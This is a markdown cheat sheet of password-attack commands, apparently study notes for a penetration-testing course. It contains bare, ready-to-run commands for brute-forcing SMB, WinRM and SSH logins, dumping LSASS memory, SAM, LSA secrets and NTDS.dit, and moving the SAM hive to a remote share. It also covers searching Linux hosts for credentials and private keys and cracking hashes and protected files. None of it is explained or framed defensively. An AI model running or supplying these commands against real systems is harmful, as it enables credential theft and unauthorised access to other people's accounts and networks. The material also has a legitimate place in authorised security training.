# Password Attacks

## 1. Password Mutations

```bash
cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist

hashcat --force password.list -r custom.rule --stdout > mut_password.list

./username-anarchy -i /path/to/listoffirstandlastnames.txt

curl -s https://fileinfo.com/filetypes/compressed | html2text | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt
```

## 2. Remote Password Attacks

```bash
crackmapexec winrm <ip> -u user.list -p password.list

crackmapexec smb <ip> -u "user" -p "password" --shares

hydra -L user.list -P password.list <service>://<ip>
hydra -l username -P password.list <service>://<ip>
hydra -L user.list -p password <service>://<ip>
hydra -C <user_pass.list> ssh://<IP>

crackmapexec smb <ip> --local-auth -u <username> -p <password> --sam
crackmapexec smb <ip> --local-auth -u <username> -p <password> --lsa
crackmapexec smb <ip> -u <username> -p <password> --ntds

evil-winrm -i <ip> -u Administrator -H "<passwordhash>"
```

## 3. Windows Local Password Attacks

```powershell
tasklist /svc

findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml

Get-Process lsass
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full

pypykatz lsa minidump /path/to/lsassdumpfile

reg.exe save hklm\sam C:\sam.save
move sam.save \\<ip>\share

python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

vssadmin CREATE SHADOW /For=C:
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

## 4. Linux Local Password Attacks

```bash
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib|fonts|share|core" ;done

for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "#" ;done

for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc|lib|headers|share|man";done

find /home/* -type f -name "*.txt" -o ! -name "*.*"

grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"

tail -n5 /home/*/.bash*
```

## 5. Cracking Passwords

```bash
hashcat -m 1000 dumpedhashes.txt /usr/share/wordlists/rockyou.txt

hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt --show

unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes

hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked

python3 ssh2john.py SSH.private > ssh.hash
john ssh.hash --show

office2john.py Protected.docx > protected-docx.hash
john --wordlist=rockyou.txt protected-docx.hash

pdf2john.pl PDF.pdf > pdf.hash
john --wordlist=rockyou.txt pdf.hash

zip2john ZIP.zip > zip.hash
john --wordlist=rockyou.txt zip.hash

bitlocker2john -i Backup.vhd > backup.hashes

for i in $(cat rockyou.txt);do openssl enc -aes-256-cbc -d -in GZIP.gzip -k $i 2>/dev/null | tar xz;done
```
